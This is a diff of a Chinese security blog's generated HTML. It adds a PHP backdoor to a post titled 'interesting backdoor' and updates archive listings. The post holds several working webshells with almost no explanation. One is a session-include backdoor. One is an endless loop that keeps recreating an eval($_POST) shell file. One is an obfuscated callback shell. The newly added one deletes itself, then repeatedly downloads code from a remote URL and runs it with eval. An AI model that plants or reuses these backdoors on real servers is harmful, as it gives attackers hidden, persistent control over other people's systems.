@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,193</span> / Reading time: <span class="post-count">7 min</span></span>
+                        <span>Word count: <span class="post-count">1,235</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -421,6 +421,7 @@
 <h1 id="有趣-backdoor"><a href="#有趣-backdoor" class="headerlink" title="有趣 backdoor"></a>有趣 backdoor</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[0-9]/'</span>,$_SESSION[<span class="string">'PHPSESSID'</span>]))</span><br><span class="line">                   <span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'//|./'</span>,$_SESSION[<span class="string">'PHPSESSID'</span>]))</span><br><span class="line">                   <span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">include</span>(ini_get(<span class="string">"session.save_path"</span>).<span class="string">"/sess_"</span>.$_SESSION[<span class="string">'PHPSESSID'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$file = <span class="string">"veneno.php"</span>;</span><br><span class="line">$shell = <span class="string">"&lt;?php eval($_POST[venenohi]);?&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists($file)) &#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = $_SERVER[<span class="string">"HTTP_ACCEPT"</span>].<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    unlink($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]);     <span class="comment">//删除脚本</span></span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $remote_file = <span class="string">'http://xxx/xxx.txt'</span>;               <span class="comment">// 从远端获取指令</span></span><br><span class="line">    <span class="keyword">while</span>($code = file_get_contents($remote_file))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -1245,16 +1246,9 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 44
+        Total : 45
         </div>
         <!-- search  -->
         
@@ -1267,6 +1261,11 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/posts/32469/">noxctf-writeup</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1290,12 +1289,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1405,12 +1404,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
